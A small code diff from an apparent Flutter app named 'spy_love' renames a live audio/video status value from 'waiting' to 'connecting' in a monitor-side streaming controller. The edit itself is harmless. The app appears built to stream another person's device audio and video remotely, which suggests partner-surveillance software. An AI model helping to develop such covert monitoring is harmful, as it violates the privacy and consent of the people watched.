@@ -4,7 +4,7 @@ import 'package:spy_love/core/network/media_stream_client.dart';
 import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';
 import 'package:spy_love/features/monitoring/live_av/live_media_session.dart';
 
-enum LiveAvStatus { idle, requesting, waiting, live, ended, error }
+enum LiveAvStatus { idle, requesting, connecting, live, ended, error }
 
 /// Monitor-side controller for the Live AV tab.
 class LiveAvController extends ChangeNotifier {
@@ -38,7 +38,7 @@ class LiveAvController extends ChangeNotifier {
   Uint8List? get lastPcm => _lastPcm;
   int get pcmSampleRate => _pcmSampleRate;
   bool get isStreaming =>
-      _status == LiveAvStatus.live || _status == LiveAvStatus.waiting;
+      _status == LiveAvStatus.live || _status == LiveAvStatus.connecting;
 
   Future<void> start(
     String deviceId, {
@@ -70,7 +70,7 @@ class LiveAvController extends ChangeNotifier {
       return;
     }
     _session = requested.left;
-    _setStatus(LiveAvStatus.waiting);
+    _setStatus(LiveAvStatus.connecting);
 
     final connected = await _stream.connect(
       _session!.wsPath,
